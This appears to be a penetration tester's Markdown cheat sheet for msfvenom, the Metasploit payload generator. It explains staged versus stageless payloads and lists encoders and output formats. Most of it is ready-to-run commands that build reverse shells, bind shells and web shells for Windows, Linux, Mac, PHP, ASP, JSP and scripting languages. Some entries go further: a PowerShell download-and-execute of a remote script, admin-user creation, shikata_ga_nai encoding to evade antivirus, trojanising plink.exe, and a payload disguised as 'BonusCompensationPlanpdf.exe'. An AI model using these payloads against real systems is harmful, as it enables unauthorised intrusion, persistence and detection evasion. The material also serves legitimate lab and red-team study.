---
id: Msfvenom
aliases: []
tags:
  - Pentest/Tools/Metasploit/Msfvenom
---

# Msfvenom

[MSFVenom](https://www.offsec.com/metasploit-unleashed/msfvenom/)
replaces [MSFPayload](https://www.offsec.com/metasploit-unleashed/msfpayload/)
and [MSFEncode](https://www.offsec.com/metasploit-unleashed/msfencode/)

<!-- Info {{{-->
> [!info]- Resources
>
> - [HackTricks - MSFVenom CheatSheet](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html)
>
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]- Deprecated
>
> - [MSFPayload](https://www.offsec.com/metasploit-unleashed/msfpayload/):
>   Used to generate shellcode for a specific processor architecture
>   and OS release
> - [MSFEncode](https://www.offsec.com/metasploit-unleashed/msfencode/):
>   Used to removing bad characters (*hexadecimal opcodes*)
>   from shellcode and AV evasion
>
<!-- }}} -->

```sh
msfvenom -h
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
> ```
> ```sh
> Found 1 compatible encoders
> ```
<!-- }}} -->

___

<!-- General {{{-->
## General

**Staged Payload**

A staged payload is sent across the network in multiple components

A staged payload will send a small stage
that will be executed on the target
and then call back to the attack box
to download the remainder of the payload

```sh
linux/x86/shell/reverse_tcp
```

<!-- Example {{{-->
> [!example]-
>
> - `/shell/`: The stage to send
> - `/reverse_tcp`: Another stage (*Payload*)
>
> ```sh
> linux/x86/shell/reverse_tcp
> ```
>
<!-- }}} -->


**Stageless Payload**

A stageless payload is sent across the network in its entirety

A stageless payload may be better for evasion purposes
due to less traffic passing over the network
to execute the payload

```sh
linux/zarch/meterpreter_reverse_tcp
```

<!-- Example {{{-->
> [!example]-
>
> - `/zarch`: Architecture
> - `/meterpreter_reverse_tcp`: has the shell payload and network communications
>   all within the same function
>
> ```sh
> linux/zarch/meterpreter_reverse_tcp
> ```
>
<!-- }}} -->

___
<!-- }}} -->

<!-- List {{{-->
## List

List Payloads

```sh
msfvenom -l payloads
```

```sh
msfvenom -l payloads | grep <platform>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfvenom -l encoders | grep windows
> ```
> ```sh
>     cmd/windows/adduser                                                Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
>     cmd/windows/bind_lua                                               Listen for a connection and spawn a command shell via Lua
>     cmd/windows/bind_perl                                              Listen for a connection and spawn a command shell via perl (persistent)
>     cmd/windows/bind_perl_ipv6                                         Listen for a connection and spawn a command shell via perl (persistent)
>     cmd/windows/bind_ruby                                              Continually listen for a connection and spawn a command shell via Ruby
>     cmd/windows/download_eval_vbs                                      Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a short command line.
>     cmd/windows/download_exec_vbs                                      Download an EXE from an HTTP(S) URL and execute it
>     cmd/windows/generic                                                Executes the supplied command
>     cmd/windows/http/x64/custom/bind_ipv6_tcp                          Fetch and execute an x64 payload from an HTTP server. Custom shellcode stage. Listen for an IPv6 connection (Windows x64)
>     cmd/windows/http/x64/custom/bind_ipv6_tcp_uuid                     Fetch and execute an x64 payload from an HTTP server. Custom shellcode stage. Listen for an IPv6 connection with UUID Support (Windows x64)
>     cmd/windows/http/x64/custom/bind_named_pipe                        Fetch and execute an x64 payload from an HTTP server. Custom shellcode stage. Listen for a pipe connection (Windows x64)
>     cmd/windows/http/x64/custom/bind_tcp                               Fetch and execute an x64 payload from an HTTP server. Custom shellcode stage. Listen for a connection (Windows x64)
>     cmd/windows/http/x64/custom/bind_tcp_rc4                           Fetch and execute an x64 payload from an HTTP server. Custom shellcode stage. Connect back to the attacker
> ```
<!-- }}} -->

List Encoders

```sh
msfvenom -l encoders
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> Framework Encoders [--encoder <value>]
> ======================================
>
>     Name                          Rank       Description
>     ----                          ----       -----------
>     cmd/base64                    good       Base64 Command Encoder
>     cmd/brace                     low        Bash Brace Expansion Command Encoder
>     cmd/echo                      good       Echo Command Encoder
>     cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
>     cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
>     cmd/perl                      normal     Perl Command Encoder
>     cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
>     cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
>     generic/eicar                 manual     The EICAR Encoder
>     generic/none                  normal     The "none" Encoder
>     mipsbe/byte_xori              normal     Byte XORi Encoder
>     mipsbe/longxor                normal     XOR Encoder
>     mipsle/byte_xori              normal     Byte XORi Encoder
>     mipsle/longxor                normal     XOR Encoder
>     php/base64                    great      PHP Base64 Encoder
>     php/hex                       great      PHP Hex Encoder
>     php/minify                    great      PHP Minify Encoder
>     ppc/longxor                   normal     PPC LongXOR Encoder
>     ppc/longxor_tag               normal     PPC LongXOR Encoder
>     ruby/base64                   great      Ruby Base64 Encoder
>     sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
>     x64/xor                       normal     XOR Encoder
>     x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
>     x64/xor_dynamic               normal     Dynamic key XOR Encoder
>     x64/zutto_dekiru              manual     Zutto Dekiru
>     x86/add_sub                   manual     Add/Sub Encoder
>     x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
>     x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
>     x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
>     x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
>     x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
>     x86/bmp_polyglot              manual     BMP Polyglot
>     x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
>     x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
>     x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
>     x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
>     x86/countdown                 normal     Single-byte XOR Countdown Encoder
>     x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
>     x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
>     x86/nonalpha                  low        Non-Alpha Encoder
>     x86/nonupper                  low        Non-Upper Encoder
>     x86/opt_sub                   manual     Sub Encoder (optimised)
>     x86/service                   manual     Register Service
>     x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
>     x86/single_static_bit         manual     Single Static Bit
>     x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
>     x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
>     x86/xor_dynamic               normal     Dynamic Key XOR Encoder
>     x86/xor_poly                  normal     XOR POLY Encoder
> ```
>
<!-- }}} -->

List Formats

```sh
msfvenom -l formats
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfvenom -l formats
> ```
> ```sh
> Framework Executable Formats [--format <value>]
> ===============================================
>
>     Name
>     ----
>     asp
>     aspx
>     aspx-exe
>     axis2
>     dll
>     ducky-script-psh
>     elf
>     elf-so
>     exe
>     exe-only
>     exe-service
>     exe-small
>     hta-psh
>     jar
>     jsp
>     loop-vbs
>     macho
>     msi
>     msi-nouac
>     osx-app
>     psh
>     psh-cmd
>     psh-net
>     psh-reflection
>     python-reflection
>     vba
>     vba-exe
>     vba-psh
>     vbs
>     war
>
> Framework Transform Formats [--format <value>]
> ==============================================
>
>     Name
>     ----
>     base32
>     base64
>     bash
>     c
>     csharp
>     dw
>     dword
>     go
>     golang
>     hex
>     java
>     js_be
>     js_le
>     masm
>     nim
>     nimlang
>     num
>     octal
>     perl
>     pl
>     powershell
>     ps1
>     py
>     python
>     raw
>     rb
>     ruby
>     rust
>     rustlang
>     sh
>     vbapplication
>     vbscript
>     zig
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Build {{{-->
## Build

Build a custom payload

1. Generate payload

```sh
msfvenom -p <payload> -f <format> -e <encoder> -i <encode_count> LHOST=<attacker_ip>
```

<!-- Info {{{-->
> [!info]-
>
> - `msfvenom`: Call msfvenom
> - `-e`: Specify the encoder
> - `-f`: Specify the format the generated binary will be in
> - `-p`: Define payload based on architecture
>
<!-- }}} -->

<!-- Example - Windows {{{-->
> [!example]- Windows
>
> <!-- Warning {{{-->
> > [!warning]
> >
> > Without any encoding or encryption,
> > the payload would almost certainly be detected by Windows Defender
> <!-- }}} -->
>
> Example 1
>
> ```sh
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
> ```
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> [-] No arch selected, selecting arch: x86 from the payload
> No encoder or badchars specified, outputting raw payload
> Payload size: 341 bytes
> Final size of aspx file: 2819 bytes
> ```
>
> Example 2
>
> ```sh
> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=1337 -f exe > BonusCompensationPlanpdf.exe
> ```
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> [-] No arch selected, selecting arch: x86 from the payload
> No encoder specified, outputting raw payload
> Payload size: 324 bytes
> Final size of exe file: 73802 bytes
> ```
>
<!-- }}} -->

<!-- Example - Linux {{{-->
> [!example]- Linux
>
> ```sh
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=1337 -f elf > createbackup.elf
> ```
> ```sh
> [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
> [-] No arch selected, selecting arch: x64 from the payload
> No encoder specified, outputting raw payload
> Payload size: 74 bytes
> Final size of elf file: 194 bytes
> ```
>
<!-- }}} -->

2. Set up [Generic Payload Handler](https://www.rapid7.com/db/modules/exploit/multi/handler/)

```sh
msfconsole -q
```
```sh
use multi/handler
```
```sh
set LHOST tun0
```
```sh
set LPORT 1337
```
```sh
exploit
```

___
<!-- }}} -->

<!-- Payloads {{{-->
## Payloads

<!-- Linux {{{-->
### Linux

Reverse Shell (*Staged*)

```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
```

Reverse Shell (*Stageless*)

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
```

Bind Shell

```sh
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<ip> LPORT=<port> -f elf > bind.elf
```

SunOS (*Solaris*)

```sh
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```

___
<!-- }}} -->

<!-- Mac {{{-->
### Mac

Reverse Shell

```sh
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho > reverse.macho
```

Bind Shell

```sh
msfvenom -p osx/x86/shell_bind_tcp RHOST=<ip> LPORT=<port> -f macho > bin
```

___
<!-- }}} -->

<!-- Windows {{{-->
### Windows

Reverse Shell

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
```

Bind Shell

```sh
msfvenom -p windows/meterpreter/bind_tcp RHOST=<ip> LPORT=<port> -f exe > bind.exe
```

Create User

```sh
msfvenom -p windows/adduser USER=<username> PASS=<password> -f exe > adduser.exe
```

CMD Shell

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > prompt.exe
```

Execute Command

```sh
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
```
```sh
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```

Encoder

```sh
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

Embedded inside executable

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```

___
<!-- }}} -->

<!-- Web {{{-->
### Web

[[PHP]]

Reverse shell

```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
```sh
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

ASP/x

Reverse shell

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp >reverse.asp
```
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f aspx >reverse.aspx
```

JSP

Reverse shell

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > reverse.jsp
```

WAR

Reverse Shell

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > reverse.war
```

NodeJS

```sh
msfvenom -p nodejs/shell_reverse_tcp LHOST=<ip> LPORT=<port>
```

Script Language payloads

Perl

```sh
msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw > reverse.pl
```

Python

```sh
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > reverse.py
```

Bash

```sh
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh
```

___
<!-- }}} -->

<!-- }}} -->
